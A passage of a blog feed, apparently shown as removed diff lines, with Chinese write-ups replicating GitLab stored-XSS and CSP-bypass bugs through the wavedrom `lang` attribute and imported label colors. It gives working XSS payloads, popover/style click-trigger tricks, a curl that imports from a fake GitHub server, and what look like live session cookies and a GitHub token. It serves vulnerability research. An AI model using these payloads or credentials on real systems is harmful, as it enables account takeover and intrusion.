-另一种是 heredoc 多行文字表示法。</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;&lt;HEREDOC
-…
-HEREDOC
-
-&lt;&lt;-HEREDOC (表示结尾标识前可以有空格)
-…
-HEREDOC
-
-&lt;&lt;~HEREDOC (表示忽略换行前面的空格)
-…
-HEREDOC
-
-甚至能执行shell code，用反引号标识
- str = &lt;&lt;~`HEREDOC`
-        date
-  HEREDOC
-=&gt; "Wed Mar 25 18:51:08 IST 2020\n"
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">%()</code> <code class="language-plaintext highlighter-rouge">%Q()</code> <code class="language-plaintext highlighter-rouge">heredoc</code>引入变量的方法都是<code class="language-plaintext highlighter-rouge">#{变量名}</code></p>
-
-<h4 id="code-review">Code Review</h4>
-
-<ol>
-  <li>
-    <p>通过 drawio 画出<a href="https://drive.google.com/file/d/1RuaQELwDr-kQDS1XHNpDNi8Xh7EQ4WZI/view?usp=sharing">函数流关系图</a>。找到部分触发该漏洞函数的 controller。</p>
-
-    <p>在寻找 source 的过程中，进行数据流分析，从而确定数据源头。因为函数 source 未必是数据 source，在复杂应用下两者是一种间接的关系。
-数据流向上分析可以在函数流的基础上，因为大部分都是函数传参的形式。
-在分析的过程中失误了一下，导致把可能的选项排除掉了，还是要仔细一点。
-主要是数据流向太多了，分析不过来，只能通过正向分析和逆向分析，加推断来分析。</p>
-  </li>
-  <li>首先通过逆向函数流分析定位到了 Pipeline 模块，它的所有子类都可以通过该模块的下标方法进行访问。
-<em>lib/banzai/pipeline.rb</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Pipeline[nil] # =&gt; Banzai::Pipeline::FullPipeline
-Pipeline[:label] # =&gt; Banzai::Pipeline::LabelPipeline
-</code></pre></div>    </div>
-    <p>当下标为空，那么默认返回 Fullpipeline，这里有所有的过滤器，包含了漏洞函数所在的过滤器</p>
-  </li>
-  <li>
-    <p>而在审计代码时，发现函数传参时，会传递<code class="language-plaintext highlighter-rouge">pipeline: :label</code>这样的形式传递，因此向直接正向分析来定位哪里传递了该参数。</p>
-
-    <p><img src="/assets/gitlab/1/pipeline.png" alt="pipeline" /></p>
-
-    <p>可以看到模型中也定义了该属性，例如 attr_mentionable: note, pipeline: :note</p>
-
-    <p>对应 NotePipeline，该 pipeline 继承自 FullPipeline</p>
-  </li>
-  <li>
-    <p>从 note 模型出发，看看该 pipeline 怎么使用的。定位到 notes_controller，发现该 controller 类没有 new 相关实现，于是直接搜索 Note.new 实例化的地方。</p>
-
-    <p><img src="/assets/gitlab/1/note_new.png" alt="note_new" /></p>
-
-    <p><img src="/assets/gitlab/1/snippet.png" alt="snippet" /></p>
-
-    <p>直接定位到 snippets_controller，会生成 note，因此找到该 controller 的路由。</p>
-  </li>
-  <li>
-    <p>无意中找到开发者模式下，rails 提供路由信息的页面为：<code class="language-plaintext highlighter-rouge">http://10.206.44.20:8830/rails/info/routes</code>
-路由文件为：<em>config/routes/development.rb</em></p>
-  </li>
-  <li>
-    <p>因此直接寻找 snippets 关键字。</p>
-
-    <p><img src="/assets/gitlab/1/snppet_router.png" alt="snppet_router" /></p>
-
-    <p>找到了 snippets 的路由，直接在浏览器打开，进入到生成路由界面。</p>
-  </li>
-  <li>
-    <p>进入路由页面，例如：<code class="language-plaintext highlighter-rouge">http://10.206.44.19:8830/-/snippets/16</code>。</p>
-
-    <p>输入 payload 为：<code class="language-plaintext highlighter-rouge">&lt;pre lang='/"onerror=alert();//'&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;</code></p>
-
-    <p>可以看到<code class="language-plaintext highlighter-rouge">lang</code>属性的值注入了双引号和 onerror 属性。提交 payload 后，后端返回渲染片段，<strong>注入属性成功，但是 csp 阻止 xss 执行</strong>。</p>
-  </li>
-  <li>
-    <p>如果绕过 csp，既然可以注入某些属性，那么考虑是否可以注入 class 属性以及 data 属性，然后寻找前端 jquery 初始化的 gadget，通过属性值输入 xss:</p>
-
-    <p><img src="/assets/gitlab/1/jquerysearch.png" alt="jquerysearch" /></p>
-
-    <p>可以看到，包含 jQuery 的文件有 179 个，一天看 10 个，半个月可以看完，也不是很难。</p>
-  </li>
-  <li>
-    <p>由于 gitlab 是 rails 后端和 vue 前端同时渲染，如何定位到 vue 前端的位置呢？官网给出了解释：</p>
-
-    <p><a href="https://docs.gitlab.com/ee/development/fe_guide/performance.html#page-specific-javascript">引用</a>
-Webpack has been configured to automatically generate entry point bundles based on the file structure in app/assets/javascripts/pages/*. The directories in the pages directory correspond to Rails controllers and actions. These auto-generated bundles are automatically included on the corresponding pages.
-For example, if you were to visit https://gitlab.com/gitlab-org/gitlab/-/issues, you would be accessing the app/controllers/projects/issues_controller.rb controller with the index action. If a corresponding file exists at pages/projects/issues/index/index.js, it is compiled into a webpack bundle and included on the page.
-When unsure what controller and action corresponds to a page, inspect document.body.dataset.page in your browser’s developer console from any page in GitLab.</p>
-
-    <p><img src="/assets/gitlab/1/vuejs.png" alt="vuejs" /></p>
-
-    <p>即根据后端目录结构来加载相应的 vue app。另外，也可以在页面前端通过<code class="language-plaintext highlighter-rouge">document.body.dataset.page</code>返回 js 加载的路径.</p>
-  </li>
-  <li>
-    <p>看看攻击者如何绕过 csp。攻击者提示，找到 single_file_diff.js 文件，并且依据上一步找到该 js 文件加载的页面：</p>
-
-    <p>例如：<em>http://10.206.44.19:8830/gitlab-org/gitlab-shell/-/commit/8626f758a5e9cf532c4474d79d52ad540c7d091d?view=parallel</em></p>
-
-    <p>尝试注入 payload：<code class="language-plaintext highlighter-rouge">&lt;pre lang='"&gt;&lt;div&gt;hello&lt;/div&gt;&lt;/img&gt;&lt;img  '&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;</code></p>
-
-    <p>这里 pre 的 lang 设置为了想要注入的 html code，但是调试到后端发现：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag = Nokogiri::HTML::DocumentFragment.parse(%(&lt;img src="#{image_src}" /&gt;))
-img_tag = img_tag.children.first
-</code></pre></div>    </div>
-
-    <p>漏洞点位的下一行对 img_tag 进行了处理，只会取第一个碰到的元素，那就是 img 元素，尝试将 html 注入到 img 标签内,但是 image 不接收子元素，于是注入失败，只能注入属性。尝试注入 class 属性，发现:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag.set_attribute('class', 'js-render-kroki')
-</code></pre></div>    </div>
-
-    <p>后面的代码对 class 属性进行了覆盖，因此 class 属性注入也失败。看了攻击者的 payload，发现他没有刻意注入 class 元素，为什么呢？因为他利用页面上已经有 class，只需要保证注入的属性在该 class 的子元素中即可。</p>
-  </li>
-  <li>
-    <p>分析何处调用 single<em>file_diff.js，定位到：
-_app/assets/javascripts/pages/projects/commit/show/index.js</em></p>
-
-    <p><img src="/assets/gitlab/1/newdiff.png" alt="newdiff" /></p>
-
-    <p><em>app/assets/javascripts/single_file_diff.js</em></p>
-
-    <p><img src="/assets/gitlab/1/single_file_diff.png" alt="single_file_diff" /></p>
-
-    <p>可以看到，diffForPath 是 data 属性，该 gadget 读取该属性为链接，并且下载内容，直接通过 jquery 进行渲染。</p>
-  </li>
-  <li>
-    <p>因此构造 payload 为：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre lang='" data-diff-for-path="http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json"  '&gt;&lt;code lang='wavedrom'&gt;&lt;/code&gt;&lt;/pre&gt;
-</code></pre></div>    </div>
-
-    <p>其中 <em>http://10.206.44.19:8830/gnuwget/Wget2/-/raw/master/xss.json</em> 是我们自己上传的 json 文件，包含了 xss payload。</p>
-
-    <p><img src="/assets/gitlab/1/Krokixss.png" alt="Krokixss" /></p>
-  </li>
-  <li>
-    <p>触发上述 xss 需要点击按钮，因此攻击者又进一步将该按钮全屏化，只要点击页面任何位置就可以触发，这一步需要注入 style 样式。</p>
-
-    <ul>
-      <li>首先注入 style 属性，首先更改本 img 样式，为最大并且覆盖在页面上
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id=stage1 style="position:absolute;max-width:10000px;left:-1000px;top:-1000px;width:10000px;height:10000px;z-index:10000;"
-</code></pre></div>        </div>
-      </li>
-      <li>然后注入 3 个 data 属性
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data-triggers="click" data-toggle=popover data-html=true
-</code></pre></div>        </div>
-      </li>
-      <li>
-        <p>其中<code class="language-plaintext highlighter-rouge">data-toggle</code>和<code class="language-plaintext highlighter-rouge">data-html</code>属性将本元素定义为下拉菜单。由 vue app 负责页面初始化时进行扫描并且转换。搜索关键字： <code class="language-plaintext highlighter-rouge">data-toggle="popover</code> ，找到一处引用:
-<em>app/assets/javascripts/popovers/index.js</em></p>
-
-        <p><img src="/assets/gitlab/1/popover.png" alt="popover" /></p>
-
-        <p>经过简单分析，该类会在网页初始化时自动执行，并且对所有包含 data-toggle 属性的元素进行 popover 下拉菜单构建。这个潜在的漏洞点已经碰到多次。因此就好办了，对于任何用属性作为选择器来操作元素的代码，是极其不安全的。并且这个漏洞点还有一点就是 data 属性的值配合 vue 的 v-html 或者 v-safe-html 来实现</p>
-      </li>
-      <li><code class="language-plaintext highlighter-rouge">data-triggers</code>也是负责下拉菜单的初始化。由于 gitlab 项目中搜索 triggers 关键字（vue 会去掉 data 前缀）没有任何收获，于是去掉该属性后发现 Trigger 不了，就是 popover 并不会出现，即使构造了 popover app。由于目标元素（img）会传递给 GlPopover 组件，该组件在 gitlab-ui 依赖中于是在 gitlab-ui 项目寻找，发现了该属性的使用。也就是说不能删除该属性。删除之后 popover 触发不了，所以不会挂载到 document 中。也就是所，组件的初始化和是否挂载到 document 是两回事。经过测试，click 和 hover 都能够触发挂载，但是 click 更稳定，而 hover 会不断触发挂载和移除，不够稳定想想也是，既然是下来菜单，需要点击或者 hover 才会渲染出现。
-参考：<a href="https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue">https://gitlab.com/gitlab-org/gitlab-ui/-/blob/main/src/components/base/popover/popover.vue</a></li>
-      <li>和最后两个 data 属性，主要更改了按钮类 svg.chevron-right 的属性让其覆盖在所有元素之上。
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data-title="aaa&amp;lt;style&amp;gt;#stage1{pointer-events:none}svg.chevron-right{position:absolute;max-width:10000px;left:-1000px;top:-1000px !important;width:10000px;height:10000px;z-index:10001;}&amp;lt;/style&amp;gt;bbb"
-data-content=ggg
-</code></pre></div>        </div>
-        <p>data-title 和 data-content 的值都会传入 v-safe-html 进行渲染，这里就可以改变目标元素的 css。让任意元素铺满屏幕等待用户点击触发。
-<em>app/assets/javascripts/popovers/components/popovers.vue</em></p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;template&gt;
-  &lt;div&gt;
-    &lt;gl-popover v-for="(popover, index) in popovers" :key="index" v-bind="popover"&gt;
-      &lt;template #title&gt;
-        &lt;span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.title"&gt;&lt;/span&gt;
-        &lt;span v-else&gt;&lt;/span&gt;
-      &lt;/template&gt;
-      &lt;span v-if="popover.html" v-safe-html:[$options.safeHtmlConfig]="popover.content"&gt;&lt;/span&gt;
-      &lt;span v-else&gt;&lt;/span&gt;
-    &lt;/gl-popover&gt;
-  &lt;/div&gt;
-&lt;/template&gt;
-</code></pre></div>        </div>
-        <p>注意 vue 中的 data 属性不带 data 字样，例如：
-<em>app/assets/javascripts/popovers/components/popovers.vue</em></p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const { content, html, placement, title, triggers = 'focus' } = element.dataset;
-</code></pre></div>        </div>
-      </li>
-    </ul>
-  </li>
-</ol>
-
-<h4 id="tips">Tips</h4>
-
-<p>该漏洞存在三个漏洞进行串联</p>
-
-<ol>
-  <li>首先是前端接受用户输入的 html 代码。如果没有后端代码，怎么知道需要注入 pre-&gt;code 这样的标签呢。</li>
-  <li>接着后端对该 html 代码处理时，未对属性值进行过滤导致可以逃出引号注入部分属性。</li>
-  <li>再是 csp 绕过，前端利用属性作为选择器，从而获取用户输入的属性值，并且处理后进行渲染，结合 jquery script 绕过。注意，之前我还在找注入 class 类引发 gadget，但是这个例子说明了特定属性也可以。
-    <ul>
-      <li>在特定页面（具体来说是特定 class 下）注入特定属性，无所谓属性所在的标签是什么</li>
-      <li>前端直接使用特定属性作为选择器，从而构造特定属性值。</li>
-    </ul>
-  </li>
-  <li>最后是提升触发程度，同样是前端利用属性作为选择器，从而注入特定属性，利用 data 属性和 vue v-html 来注入 style 从而改变任意元素的样式。
-    <ul>
-      <li>有全局初始化 vue app 或者说初始化 js 代码，它们用特定属性作为选择器，从而构造某些组件，例如 tooltip 或者 popover</li>
-      <li>同时注入特定属性，拦截网页初始化阶段，从而注入特定 html 或者 style，改变页面结构更容易诱发用户点击等</li>
-    </ul>
-  </li>
-  <li>注意，事件例如 click 绑定在某一元素中，那么该所有的所有子元素都可以触发该事件.</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored-XSS with CSP-bypass via labels’ color</title><link href="http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored-XSS with CSP-bypass via labels’ color" /><published>2023-11-15T10:31:06+08:00</published><updated>2023-11-15T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/15/csp-bypass-xss-label-color.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Stored-XSS with CSP-bypass via labels’ color</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<blockquote>
-  <p>gitlab 版本：14.5.2-ee</p>
-</blockquote>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/1665658">https://hackerone.com/reports/1665658</a></p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>gitlab 导入外部 github 仓库数据，并且未对数据进行过滤，导致后端渲染时 xss。伪造 github 服务器，返回 xss payload，后端渲染的时候没有对引号进行处理，导致新的标签/属性可以插入。如下，<code class="language-plaintext highlighter-rouge">bg_color</code>字段没有进行过滤。这是后端渲染的问题，xss 在后端模板被注入</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
-  &lt;&lt;~HTML.chomp.html_safe
-    &lt;span
-      class="#{css_class}"
-      data-container="body"
-      data-html="true"
-      #{"style=\"background-color: #{bg_color}\"" if bg_color}
-    &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
-  HTML
-end
-</code></pre></div></div>
-
-<h4 id="code-review">Code Review</h4>
-
-<h5 id="基于函数流分析">基于函数流分析</h5>
-
-<ol>
-  <li>首先定位到漏洞代码：
-<em>gitlab/app/helpers/labels_helper.rb#266</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
-  &lt;&lt;~HTML.chomp.html_safe
-    &lt;span
-      class="#{css_class}"
-      data-container="body"
-      data-html="true"
-      #{"style=\"background-color: #{bg_color}\"" if bg_color}
-    &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
-  HTML
-end
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>然后定位到该文件中调用该函数的两个函数，分别是 link<em>to_label 和 render_label，他们的第一个参数 label 包含了漏洞数据：
-_gitlab/app/helpers/labels_helper.rb#39</em></p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def link_to_label(label, type: :issue, tooltip: true, small: false, css_class: nil, &amp;block)
-  render_label(label, link: link, tooltip: tooltip, small: small)
-
-end
-def render_label(label, link: nil, tooltip: true, dataset: nil, small: false)
-  html = render_colored_label(label)
-end
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>首先分析 render_label 函数，引用该函数进行数据渲染的地方都是模板文件，一共有三处，这三处都是 shared view：</p>
-
-    <p><em>gitlab/app/views/shared/_label_row.html.haml</em>
-<em>gitlab/app/views/shared/milestones/_issuable.html.haml</em>
-<em>gitlab/app/views/shared/milestones/_labels_tab.html.haml</em></p>
-  </li>
-  <li>先分析第一处，旁边的_label.html.haml 引用该模板，则搜索<code class="language-plaintext highlighter-rouge">shared/label</code>关键字
-<em>gitlab/app/views/shared/_label.html.haml#10</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%li.label-list-item{ id: label_css_id, data: { id: label.id } }
-    = render "shared/label_row", label: label, force_priority: force_priority
-    %ul.label-actions-list
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>找到一处引用该模板的文件，那么 projects labels 就是路由了，进去可以看到渲染结果：
-<em>gitlab/app/views/projects/labels/index.html.haml</em></p>
-
-    <p><img src="/assets/gitlab/1/labels.png" alt="labels" /></p>
-
-    <p>渲染的 bg_color:</p>
-
-    <p><img src="/assets/gitlab/1/bg_color.png" alt="bg_color" /></p>
-  </li>
-  <li>但是新建 label 时，后端对 label 的 color 做了 valid 校验，填入非 color 会报错无法插入数据库。因此攻击者想到 bulk<em>insert，该方法可以绕过校验直接插入数据库。刚好 github_import 提供 label 的 bulk_insert 功能。怎么会想到该功能呢？并且刚好有 label 模型使用该方法插入数据呢？难道这就是碰运气吗？还是说对项目的全面理解。假设我们已经找到 label 存在 bulk_insert，其位置在类 LabelsImporter 中。复现完后，我想可能是攻击者首先对 api 进行检查，当看到 import 接口可以设置自定义的域名后，就开始从头分析，而非逆向分析。因为这种导入接口大概率存在漏洞。正向分析的过程中，检查这个接口都导入了什么资源，而且检查这些资源的渲染方式，从而定位到了漏洞。
-_gitlab/lib/gitlab/github_import/importer/labels_importer.rb#16</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def execute
-  bulk_insert(Label, build_labels)
-  build_labels_cache
-end
-</code></pre></div>    </div>
-  </li>
-  <li>注意到该攻击还绕过了 csp，绕过 csp 的方式是<code class="language-plaintext highlighter-rouge">jquery+&lt;script&gt;tag</code>，只有在渲染<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>标签可以绕过，其他的例如 onerror 不行，经过测试利用该漏洞能够绕过 script-src self csp，简直无敌。
-<em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#507</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>renderRow(item) {
-    let criteria = {};
-    let groupRowEl;
-    switch (item.type) {
-      case LEVEL_TYPES.DEPLOY_KEY:
-        groupRowEl =
-          this.accessLevel === ACCESS_LEVELS.PUSH ? this.deployKeyRowHtml(item, isActive) : '';
-        break;
-    }
-    return groupRowEl;
-  }
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>csp:</p>
-
-    <p><strong>Self</strong>: 仅仅执行同域名的 js 文件，所有 event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>内的代码都不执行。<code class="language-plaintext highlighter-rouge">Jquery+&lt;script&gt;</code>标签可绕过
-<strong>Unsafe-inline</strong>: 所有 event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>内的代码可以执行，但是出现 either a hash or nonce value，该条失效，就是说若存在’nonce-xxx’，那么 unsafe-inline 无效，event handler 和<code class="language-plaintext highlighter-rouge">&lt;script&gt;</code>内部代码都不执行。<code class="language-plaintext highlighter-rouge">Jquery+&lt;script&gt;</code>标签可绕过</p>
-  </li>
-  <li>其中 csp 绕过的 jquery 代码如下：
-<em>app/assets/javascripts/gl_field_error.js#66</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>constructor({ input, formErrors }) {
-  this.inputElement = $(input);
-  this.inputDomElement = this.inputElement.get(0);
-  this.form = formErrors;
-  this.errorMessage = this.inputElement.attr('title') || __('This field is required.');
-  this.fieldErrorElement = $(`&lt;p class='${errorMessageClass} hidden'&gt;${this.errorMessage}&lt;/p&gt;`);
-  this.state = {
-    valid: false,
-    empty: true,
-    submitted: false,
-  };
-  this.initFieldValidation();
-}
-</code></pre></div>    </div>
-    <p>可以看到<code class="language-plaintext highlighter-rouge">${this.errorMessage}</code>没有过滤直接嵌入 jquery 元素中，该处也可以形成一个 regex，该代码在整个 gitlab 源码中只匹配到了上面片段：</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\$\([`\x27"][\s\S]{0,100}?&lt;[\s\S]{3,200}?&gt;[\s\S]{0,100}?[`\x27"]\)
-</code></pre></div>    </div>
-    <p>注意在 linux command 中，<code class="language-plaintext highlighter-rouge">'</code>需要 escape，方法是\x27 代替单引号，\x22 代替双引号，下面的双引号其实不需要 escape，例如，参考：<a href="https://stackoverflow.com/a/65878993">https://stackoverflow.com/a/65878993</a></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python ~/zero/DirBrute/findRegexInDir.py -d ~/discourse -f "\.js$" -r '\$\([`\x27\x22"]&lt;[\s\S]{3,200}?&gt;[`\x27\x22]\)' -n 'node_modules|test.js|spec.js'
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>下面是负责导入 github 的后端 api 类，找到 github client，搜索 GithubImport::Client.new 来定位该类实例化的位置，可以找到两个位置，分别是：
-<em>app/controllers/import/github_controller.rb</em>
-<em>lib/api/import_github.rb</em></p>
-
-    <p><img src="/assets/gitlab/1/import_github.png" alt="import_github" /></p>
-
-    <p>其中 github<em>controller 中，host 无法被修改，因此默认为 github 的 api：
-_app/controllers/import/github_controller.rb#108</em></p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def client
-    @client ||= if Feature.enabled?(:remove_legacy_github_client)
-                Gitlab::GithubImport::Client.new(session[access_token_key])
-            else
-                Gitlab::LegacyGithubImport::Client.new(session[access_token_key], **client_options)
-            end
-end
-</code></pre></div>    </div>
-
-    <p>而 import<em>github.rb 中 host 可以修改，因此可以控制:
-_lib/api/import_github.rb#14</em></p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def client
-    @client ||= if Feature.enabled?(:remove_legacy_github_client)
-                Gitlab::GithubImport::Client.new(params[:personal_access_token], host: params[:github_hostname])
-            else
-                Gitlab::LegacyGithubImport::Client.new(params[:personal_access_token], client_options)
-            end
-end
-</code></pre></div>    </div>
-
-    <p>注意到，只能通过 github 来导入，如果选择用 git 或者其他方式导入，那么不会导入 labels。</p>
-  </li>
-  <li>
-    <p>经过分析 import_github.rb 是 grape 构建的 api 接口，可以通过/v4/api 访问调用，参考：
-<a href="https://github.com/ruby-grape/grape">https://github.com/ruby-grape/grape</a></p>
-
-    <p><em>lib/api/api.rb</em>
-<em>config/routes/api.rb</em>
-<em>config/routes.rb#273</em>
-最终被 mount 挂载到主路由文件中</p>
-  </li>
-  <li>
-    <p>导入测试，需要伪造一个假 github 服务器。首先通过导入正常的 github 仓库，并且对 gitlab 后端进行抓包，从而查看 gitlab 如何与 github 交互。</p>
-  </li>
-  <li>
-    <p>首先在 gitlab 所在的 Ubuntu 服务器上安装 burpsuite 证书，参考<a href="https://ubuntu.com/server/docs/security-trust-store">该链接</a>，安装 burpsuite 证书到系统 ca 根目录。然后设置终端 http_proxy 和 https_proxy 系统变量为 windows host 的 burpsuite 端口。启动 gitlab 服务后，rails 自动使用该代理。设置后，从 github 导入项目时，后端发送的请求就能够通过 burp 拦截。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export https_proxy=http://10.15.0.147:8085
-export http_proxy=http://10.15.0.147:8085
-</code></pre></div>    </div>
-
-    <p><img src="/assets/gitlab/1/import1.png" alt="import1" /></p>
-
-    <p><img src="/assets/gitlab/1/import2.png" alt="import2" /></p>
-  </li>
-  <li>
-    <p>伪造 fake github server，需要一个公网服务器，并且在该服务器上安装 gitea 以便 gitlab 能导入仓库数据。node server 代码如下：</p>
-
-    <p><a href="vscode-local:/c%3A/Users/11593/AppData/Local/Temp/OneNote/16.0/Exported/%7B2E4B8080-29FE-40E1-B921-B593FF5E3AE4%7D/NNT/0/rb.zip">github fake server</a></p>
-
-    <p><strong>gitea 配置</strong></p>
-
-    <p>伪造的服务器需要配置 gitea 服务，并且需要和伪造请求中的 git 地址一样，这样 gitlab 会从伪造的服务器拉取代码和后续 labels 请求，否则还是会去 github 拉取。gitea 默认开启在 3000 端口，但是可通过 nginx proxy 代理到 80 端口，这一步是必要的。</p>
-  </li>
-  <li>
-    <p>fake github server 配置完成后，直接调用 gitlab 提供的 api 进行导入操作：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl --location 'http://127.0.0.1:3000/api/v4/import/github' \
---header 'Accept: application/json, text/plain, */*' \
---header 'Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5' \
---header 'Cache-Control: no-cache' \
---header 'Connection: keep-alive' \
---header 'Cookie: perf_bar_enabled=true; preferred_language=en; hide_auto_devops_implicitly_enabled_banner_8=false; visitor_id=ae1ea916-faeb-458b-a6fe-e823e28e4946; frequently_used_emojis=smile%2Csmiley%2Cblush%2Cflag_wf%2Cman_dancing_tone3%2Cman_dancing_tone1; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqTmlOVE0zWkRnMExXWm1ZV0V0TkRrd1pTMDVORGswTFRJell6VTVaalJqWmpjek15ST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--e03f99e2fe31888f17b1a38192c53e1a7c6eebe7; sidebar_collapsed=false; BetterErrors-2.9.1-CSRF-Token=7ebd9970-0ce3-4b4f-b4d6-0a96114c3c57; known_sign_in=cC9DbkxsUmZZVG1EeGZ3bGhlQmVXQlVqWnVKQ2k1aklucEc1QmpXTjQrUTBYQ2M1c2l4K0J4czRxclRVekNmZmFSeVRKaGduYzJ4eEQxa2ZRUmhzWEdZeXV0VTdyd21pMnlkd3ltdExOYWlEeHVDUlNwMjdvTEVKQWNvaFZGdFotLS9TNTRJc3gwWEdtRTYxamFOWmhUU3c9PQ%3D%3D--33ef27c41f5b2d1b3b3f81b201525cb25ad31280; hide_auto_devops_implicitly_enabled_banner_6=false; event_filter=push; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hYU3dpSkRKaEpERXdKRWR6TjNCbWJIaERiM2hYYW1WelpFcEVMakppTnk0aUxDSXhOekF3TmpFMk56VXdMakU0TURVeE5ETWlYUT09IiwiZXhwIjoiMjAyMy0xMi0wNlQwMTozMjozMC4xODBaIiwicHVyIjoiY29va2llLnJlbWVtYmVyX3VzZXJfdG9rZW4ifX0%3D--d9f8a3d3facd1ae216b64bae4390ee38fd8cd5e2; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=bbe97137c1f77a28d631400fc209d6b4; _gitlab_session_07baa7241726843883bf7ec3444d875952c2c2a722793cb27890cede722617b2=42172205f2e8b1d7619454840d139af6' \
---header 'Pragma: no-cache' \
---header 'Referer: http://127.0.0.1:3000/root/final5' \
---header 'Sec-Fetch-Dest: empty' \
---header 'Sec-Fetch-Mode: cors' \
---header 'Sec-Fetch-Site: same-origin' \
---header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' \
---header 'X-CSRF-Token: gmIiPkGG+9ZjV7zsBfslb4QjfYZSFDSszxzQy2/+RcfCFZtow6G8uogwP2lpmW4PIWuywI71kwZ5Ezvbw802/g==' \
---header 'X-Requested-With: XMLHttpRequest' \
---header 'sec-ch-ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"' \
---header 'sec-ch-ua-mobile: ?0' \
---header 'sec-ch-ua-platform: "Windows"' \
---header 'Content-Type: application/json' \
---data '{"repo_id":721517979,"personal_access_token":"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","new_name":"final7","target_namespace":"root","github_hostname":"http://8.134.66.236"}'
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h4 id="tips">Tips</h4>
-
-<ol>
-  <li>该漏洞输入后端渲染漏洞，本来后端渲染数据是通过默认的 haml 模板用=进行渲染，这时会自动完成对数据的 escape，但是这里的漏洞采用了函数调用返回 html 字符串的形式，并且字符串在函数中标注了<code class="language-plaintext highlighter-rouge">HTML.chomp.html_safe</code>。
-<em>app/views/shared/_label_row.html.haml</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.label-name.gl-flex-shrink-0.gl-mt-2.gl-mr-3
-  = render_label(label, tooltip: false)
-</code></pre></div>    </div>
-    <p><em>gitlab/app/helpers/labels_helper.rb#266</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
